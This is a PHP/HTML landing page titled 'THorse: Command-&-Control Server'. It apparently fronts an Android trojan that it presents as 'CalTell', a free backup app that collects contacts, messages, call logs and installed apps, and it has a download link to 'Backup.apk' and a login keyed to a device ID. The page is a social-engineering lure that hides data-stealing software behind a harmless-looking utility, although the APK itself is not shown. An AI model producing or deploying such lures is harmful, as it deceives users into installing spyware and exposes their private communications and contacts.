
<?php
//Session starts here
        session_start();
        ?>
<HTML>
<head>
<title>THorse: Command-&-Control Server</title>
<meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="apple-touch-icon" href="apple-touch-icon.png">

       
        <link rel="stylesheet" href="bootstrap-theme.min.css">
        <link rel="stylesheet" href="fontAwesome.css">
        <link rel="stylesheet" href="hero-slider.css">
        <link rel="stylesheet" href="owl-carousel.css">
        <link rel="stylesheet" href="templatemo-style.css">
		
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="w3.css">
    <link rel="stylesheet" href="w3-theme-blue-grey.css">
    <link rel="stylesheet" href="css.css">
    <link rel="stylesheet" href="font-awesome.css">
    <link rel="stylesheet" href="cssStyle.css">
    
        <!--For Plugins external css-->
        <link rel="stylesheet" href="plugins.css" />
        <!--Theme custom css -->
        <link rel="stylesheet" href="style.css">
        <!--Theme Responsive css-->
        <link rel="stylesheet" href="assets/css/responsive.css" />
        <script src="modernizr-2.8.3-respond-1.4.2.min.js"></script>

        <link href="https://fonts.googleapis.com/css?family=Spectral:200,200i,300,300i,400,400i,500,500i,600,600i,700,700i,800,800i" rel="stylesheet">
        <link href="https://fonts.googleapis.com/css?family=Roboto:100,300,400,500,700,900" rel="stylesheet">

	</head>
    <body class="w3-theme-l5">
        <div align="center">
       <div class="container" style="background-color: #607d8b">
	<section id="download" >
                <div class="primary-white-button">
                    <a href="app/Backup.apk"><i class="fa fa-heart"></i>Download App  <i class="fa fa-heart"></i></a>
                </div>
	</div>
    </section>

        
        <div class="panel">
                <form action="public/client_login.php" method="POST">
                    <div class="w3-card-2 w3-round w3-theme-d4">  
                        <label> <a href="register.php">Register Here</a></label><br><br>
                        <H2>Login</H2>
                        <div class="imgcontainer">
                            <img src="images/avatar.png" alt="Avatar" class="avatar">
                        </div>
                        <div class="container">
                            <label><b> Email Address</b></LABEL><br>
                    <INPUT type="email" placeholder="Enter Your Email" name="email" required><BR>
                            <label><b> Device ID </b></LABEL><br>
                            <b><INPUT type="password" placeholder="Enter Device ID" name="password" required><BR></b>
                            <BUTTON type="submit" name="login">Login</BUTTON>
                            <BUTTON type="reset" class="cancelbtn">Cancel</BUTTON><br>
                            
                            
                    </div>  
                        <INPUT type="checkbox" checked="checked">Remember Me.
                        <label> Forgot <a href="recover.php">Password?</a></label></div><br>
                     
                </form>
		</div>
    
				
		<section class="cook-delecious">
		<div class="container" style="background-color: #f1f1f1">
        <div class="panel">
                    <div class="cook-content">
                        <h4>CalTell</h4>
                        <div class="contact-content" style="align-items: center">
                            This application helps back up your phone data. It backs up:
                            <br><br><ol><li>Phonebook Contacts</li><li>Phone Messages</li><LI>Call Logs</li><LI>Installed Apps</LI></ol>
                            <br>
							Download the application and register for free!
							<br>
						</div>
                        <span>"<i class="fa fa-heart">"</i></span>
                        <div class="primary-white-button">
                            <a href="app/Backup.apk" class="scroll-link" data-id="book-table"><i class="fa fa-heart"></i>Download  <i class="fa fa-heart"></i></a>
                        </div>
                    </div>
                </div>
    </section>
		
	</div>
              
    </body>
</HTML>